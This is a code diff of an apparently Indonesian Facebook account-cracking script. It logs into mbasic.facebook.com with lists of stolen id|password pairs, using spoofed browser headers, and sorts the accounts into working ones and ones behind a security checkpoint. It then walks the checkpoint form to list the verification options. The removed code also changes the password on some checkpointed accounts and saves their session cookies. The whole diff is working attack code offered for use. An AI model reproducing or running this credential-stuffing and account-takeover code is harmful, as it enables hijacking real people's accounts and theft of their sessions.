@@ -706,136 +706,35 @@ def cek_apk(kukis):
 	except AttributeError:
 		print ("\r      %s• cookie invalid"%(M))
 
-# CEKPOINT DETEKTOR
-def file_cp():
-	dirs = os.listdir('CP')
-	print ("\n%s•%s [%s pilih hasil crack yg tersimpan untuk cek opsi %s]\n"%(U,O,U,O))
-	for file in dirs:
-		print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
+#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
+def ceker(idf,pw):
+	global cp
+	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
+	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+	ses = requests.Session()
 	try:
-		print("\n%s%s%s Masukan file [ cth%s: %s%s.txt%s ]"%(U,til,O,M,K,waktu,O))
-		opsi()
-	except IOError:
-		print ('%s• file tidak ada'%(M))
-		exit()
-
-def opsi():
-	CP = ("CP/")
-	romi = input("%s%s%s Nama file %s> %s"%(U,til,O,M,K))
-	if romi == "":
-		print("%s%s isi yang benar "%(M,til));jeda(2)
-		opsi()
-	try:
-		file_cp = open(CP+romi, "r").readlines()
-	except IOError:
-		exit("\n%s%s nama file %s tidak tersedia"%(M,til,romi))
-	jalan("%s•%s Mode pesawatkan terlebih dahulu 5 detik "%(U,O))
-	pw=input("\n%s%s%s ubah sandi pada akun one tab? y/t %s> %s"%(U,til,O,M,K))
-	if pw in['y','Y']:
-		ubah_pass.append("ubah_sandi")
-		pw2 = input("%s%s%s masukan sandi %s> %s"%(U,til,O,M,K))
-		if len(pw2) <= 5:
-			print("%s• sandi minimal 6 karakter "%(M))
+		hi = ses.get('https://mbasic.facebook.com')
+		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
+		jo = ho.find('form')
+		data = {}
+		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
+		for anj in jo('input'):
+			if anj.get('name') in lion:
+				data.update({anj.get('name'):anj.get('value')})
+		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
+		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
+		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+		cp+=1
+		opsi = kent.find_all('option')
+		if len(opsi)==0:
+			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
 		else:
-			pwbaru.append(pw2)
-	print("\n %s# %s════════════════════════════════ %s#"%(P,M,P));jeda(2)
-	print ("%s%s%s total akun %s: %s%s "%(U,til,O,M,K,str(len(file_cp))))
-	print(" %s# %s════════════════════════════════ %s#"%(P,M,P));jeda(2)
-	nomor = 0
-	for fb in file_cp:
-		akun = fb.replace("\n","")
-		ngecek  = akun.split(" ◊ ")
-		nomor+=1
-		print("\n%s%s.%s login akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
-		try:
-			mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
-		except requests.exceptions.ConnectionError:
-			continue
-	print("\n%s%s%s Selesai mengecek akun"%(U,til,O));jeda(0.07)
-	#os.popen('play-audio data/cek.mp3')
-	input('%s%s%s [%s Enter%s ] '%(U,til,O,U,O))
-	pilihan().menu()
-	
-data = {}
-data2 = {}
-
-def mengecek(user,pw):
-	global loop,ubah_pass,pwbaru
-	session=requests.Session()
-	url = "https://mbasic.facebook.com"
-	session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
-	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
-	link=soup.find("form",{"method":"post"})
-	for x in soup("input"):
-		data.update({x.get("name"):x.get("value")})
-	data.update({"email":user,"pass":pw})
-	urlPost=session.post(url+link.get("action"),data=data)
-	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
-	if "c_user" in session.cookies.get_dict():
-		if "Akun Anda Dikunci" in urlPost.text:
-			print("\r%s• akun terkunci sesi new"%(M))
-		else:
-			print("\r%s• akun tidak checkpoint, silahkan anda login "%(H))
-			#os.popen('play-audio dapet.mp3')
-			open('OK/%s.txt'%(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
-	elif "checkpoint" in session.cookies.get_dict():
-		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-		title=re.findall("\<title>(.*?)<\/title>",str(response))
-		link2=response.find("form",{"method":"post"})
-		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
-		for x in response("input"):
-			if x.get("name") in listInput:
-				data2.update({x.get("name"):x.get("value")})
-		an=session.post(url+link2.get("action"),data=data2)
-		response2=bs4.BeautifulSoup(an.text,"html.parser")
-		cek=[cek.text for cek in response2.find_all("option")]
-		number=0
-		print("\r%s%s%s terdapat %s%s%s opsi %s:"%(U,til,O,P,str(len(cek)),O,M));jeda(0.07)
-		if(len(cek)==0):
-			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
-				if "ubah_sandi" in ubah_pass:
-					dat,dat2={},{}
-					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
-					for x in response("input"):
-						if x.get("name") in but:
-							dat.update({x.get("name"):x.get("value")})
-					ubahPw=session.post(url+link2.get("action"),data=dat).text
-					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
-					link3=resUbah.find("form",{"method":"post"})
-					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
-					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
-						for b in resUbah("input"):
-							dat2.update({b.get("name"):b.get("value")})
-						dat2.update({"password_new":"".join(pwbaru)})
-						an=session.post(url+link3.get("action"),data=dat2)
-						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-						print("\r%s%s akun one tab, sandi berhasil di ubah \n *--> %s ◊ %s ◊ %s			"%(H,til,user,pwbaru[0],coki))
-						#os.popen('play-audio dapet.mp3')
-						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s\n" % (user,pwbaru[0],coki))
-						cek_apk(coki)
-				else:
-					print("\r%s%s akun one tab, silahkan anda login		"%(H,til))
-					#os.popen('play-audio dapet.mp3')
-					open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s\n" % (user,pw,coki))
-					cek_apk(coki)
-			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
-				print("\r%s• akun terpasang autentikasi dua faktor			"%(M))
-			else:
-				print("%s%s terjadi kesalahan"%(M,til))
-		else:
-			if "c_user" in session.cookies.get_dict():
-				print("\r%s• akun tidak checkpoint, silahkan anda login "%(H))
-				#os.popen('play-audio dapet.mp3')
-				open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
-		for opsi in range(len(cek)):
-			number +=1
-			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
-	elif "login_error" in str(response):
-		oh = run.find("div",{"id":"login_error"}).find("div").text
-		print("%s• %s"%(M,oh))
-	else:
-		print("%s%s login gagal, silahkan cek kembali id dan kata sandi"%(M,til))
-		
+			for opsii in opsi:
+				print('\r%s---> %s%s'%(kk,opsii.text,x))
+	except Exception as c:
+		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
+		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
+		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 #HAPUS HASIL
 def hapus_hasil():
 	os.system('rm -rf CP/*.txt && OK/*.txt')
@@ -866,101 +765,66 @@ def cek_cek(rom):
 		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
 		pilihan().menu()
 		
-# CEK HASIL FACEBOOK
-def hasil_fb():
-	hasill()
-	l = input('\n%s#%s Pilih %s> %s '%(P,O,M,K))
-	if l in['']:
-		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
-		menu()
-	elif l in['1','01']:
-		dirs = os.listdir('OK')
-		print ("\n%s•%s [%s hasil crack yang tersimpan %s]\n"%(U,O,U,O))
-		for file in dirs:
-			print("%s•%s> %s%s"%(U,M,H,file));jeda(0.07)
+#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
+def cek_opsi():
+	c = len(akun)
+	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
+	cetak(nel(hu, title='CEK OPSI'))
+	input(x+'['+h+'•'+x+'] Mulai')
+	cek = '# PROSES CEK OPSI DIMULAI'
+	sol().print(mark(cek, style='green'))
+	love = 0
+	for kes in akun:
 		try:
-			file = input("\n%s•%s masukan file %s:%s "%(U,O,M,H));jeda(0.2)
-			if file in['']:
-				exit("%s• isi yang benar kentod"%(M))
-			totalok = open('OK/%s'%(file)).read().splitlines()
-		except (KeyError, IOError):
-			print("%s%s file tidak ada "%(M,til))
-		nm_file = ('%s'%(file)).replace('-', ' ')
-		file_nm = nm_file.replace('.txt', '')
-		print(" %s# %s════════════════════════════════ %s#"%(P,M,P));jeda(2)
-		jalan("%s•%s hasil tanggal%s : %s%s %stotal %s: %s%s"%(U,O,M,H,file_nm,O,M,H,len(totalok)))
-		print(" %s# %s════════════════════════════════ %s#%s"%(P,M,P,H));jeda(2)
-		os.system('cat OK/%s'%(file))
-		print(" %s# %s════════════════════════════════ %s#"%(P,M,P));jeda(2)
-		exit('\n')
-	elif l in['2','02']:
-		dirs = os.listdir('CP')
-		print ("\n%s•%s [%s hasil crack yang tersimpan %s]\n"%(U,O,U,O))
-		for file in dirs:
-			print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
-		try:
-			file = input("\n%s•%s masukan file %s:%s "%(U,O,M,K));jeda(0.2)
-			if file in['']:
-				exit("%s• isi yang benar kentod"%(M))
-			totalcp = open('CP/%s'%(file)).read().splitlines()
-		except (KeyError, IOError):
-			print("%s%s file tidak ada "%(M,til))
-		nm_file = ('%s'%(file)).replace('-', ' ')
-		file_nm = nm_file.replace('.txt', '')
-		print(" %s# %s════════════════════════════════ %s#"%(P,M,P));jeda(2)
-		jalan("%s•%s hasil tanggal%s : %s%s %stotal%s : %s%s"%(U,O,M,K,file_nm,O,M,K,len(totalcp)))
-		print(" %s# %s════════════════════════════════ %s#%s"%(P,M,P,K));jeda(2)
-		os.system('cat CP/%s'%(file))
-		print(" %s# %s════════════════════════════════ %s#"%(P,M,P));jeda(2)
-		exit('\n')
-	elif l in['0','00']:
-		pilihan().menu()
-	else:
-		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
-		pilihan().menu()
-		
-# CEK HASIL IGEH
-def hasil_igehh():
-	print('')
-	for i in os.listdir('IG'):
-		print("%s•%s> %s%s"%(U,M,J,i));jeda(0.07)
-	try:
-		c=input("\n%s•%s masukan file %s:%s "%(U,O,M,K))
-		if c in['']:
-			exit("\n%s• isi yang benar kentod"%(M))
-		g=open("IG/%s"%(c)).read().splitlines()
-	except FileNotFoundError:
-		exit("\n%s• file tidak tersedia"%(M))
-	xx=c.split("-")
-	xc=xx[0]
-	print(" %s# %s════════════════════════════════ %s#"%(P,M,P));jeda(2)
-	print('%s%s%s Total akun %s: %s%s '%(U,til,O,M,H,len(g)))
-	print(" %s# %s════════════════════════════════ %s#"%(P,M,P));jeda(2)
-	for s in g:
-		usr=s.split("|")[0]
-		pwd=s.split("|")[1]
-		fol=s.split("|")[2]
-		ful=s.split("|")[3]
-		if xc=="CP":
-			print(f"""{J}╔══[ {K}Checkpoint                      
-{J}║══[ {K}Username  {M}> {K}{usr}{C}
-{J}║══[ {K}Password  {M}> {K}{pwd}{C}
-{J}║══[ {K}Followers {M}> {K}{fol}{C}
-{J}╚══[ {K}Following {M}> {K}{ful}{C}
-			""");jeda(0.05)
-		else:
-			print(f"""{J}╔══[ {H}Berhasil                      
-{J}║══[ {H}Username  {M}> {H}{usr}{C}
-{J}║══[ {H}Password  {M}> {H}{pwd}{C}
-{J}║══[ {H}Followers {M}> {H}{fol}{C}
-{J}╚══[ {H}Following {M}> {H}{ful}{C}
-			""");jeda(0.05)
+			try:
+				id,pw = kes.split('|')[0],kes.split('|')[1]
+			except IndexError:
+				time.sleep(2)
+				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
+				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
+				continue
+			bi = random.choice([u,k,kk,b,h,hh])
+			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
+			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
+			ses = requests.Session()
+			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+			hi = ses.get('https://mbasic.facebook.com')
+			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
+			if "checkpoint" in ses.cookies.get_dict().keys():
+				try:
+					jo = ho.find('form')
+					data = {}
+					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
+					for anj in jo('input'):
+						if anj.get('name') in lion:
+							data.update({anj.get('name'):anj.get('value')})
+					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
+					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
+					opsi = kent.find_all('option')
+					if len(opsi)==0:
+						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
+					else:
+						for opsii in opsi:
+							print('\r%s---> %s%s'%(kk,opsii.text,x))
+				except:
+					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
+					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
+			elif "c_user" in ses.cookies.get_dict().keys():
+				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
+			else:
+				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
+			love+=1
+		except requests.exceptions.ConnectionError:
+			print('')
+			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
+			sol().print(mark(li, style='red'))
+			exit()
+	dah = '# DONE'
+	sol().print(mark(dah, style='green'))
+	exit()
 
-if __name__=="__main__":
-	()
+	"""
 	
-"""
-
     Biar apa sih di decompile anyink
     Taekkk !
 
